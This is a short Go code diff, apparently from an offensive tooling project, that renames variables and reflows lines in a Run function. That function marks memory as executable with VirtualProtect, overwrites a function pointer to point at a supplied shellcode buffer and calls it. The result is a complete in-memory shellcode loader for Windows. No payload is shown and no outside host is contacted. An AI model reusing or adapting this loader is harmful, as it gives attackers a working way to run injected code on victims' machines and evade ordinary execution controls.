@@ -16,24 +16,30 @@ func VirtualProtect(lpAddress unsafe.Pointer, dwSize uintptr, flNewProtect uint3
 	return ret > 0
 }
 
-func Run(sc []byte) {
+func Run(shellcode []byte) {
 	// Make a function ptr
-	shellcodeFunc := func() {}
+	shellcodefunc := func() {}
 
-	// Change permissions on f function ptr
+	// Change permissions on shellcodefunc function ptr
 	var oldfpemissions uint32
-	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&shellcodeFunc))), unsafe.Sizeof(uintptr(0)), uint32(0x40), unsafe.Pointer(&oldfpemissions)) {
+	if !VirtualProtect(unsafe.Pointer(*(**uintptr)(unsafe.Pointer(&shellcodefunc))),
+		unsafe.Sizeof(uintptr(0)),
+		uint32(0x40),
+		unsafe.Pointer(&oldfpemissions)) {
 		panic("Call to VirtualProtect failed!")
 	}
 
 	// Override function ptr
-	**(**uintptr)(unsafe.Pointer(&shellcodeFunc)) = *(*uintptr)(unsafe.Pointer(&sc))
+	**(**uintptr)(unsafe.Pointer(&shellcodefunc)) = *(*uintptr)(unsafe.Pointer(&shellcode))
 
 	// Change permissions on shellcode string data
-	var oldshellcodepermissions uint32
-	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&sc))), uintptr(len(sc)), uint32(0x40), unsafe.Pointer(&oldshellcodepermissions)) {
+	var oldscepermissions uint32
+	if !VirtualProtect(unsafe.Pointer(*(*uintptr)(unsafe.Pointer(&shellcode))),
+		uintptr(len(shellcode)),
+		uint32(0x40),
+		unsafe.Pointer(&oldscepermissions)) {
 		panic("Call to VirtualProtect failed!")
 	}
 
-	shellcodeFunc()
+	shellcodefunc()
 }
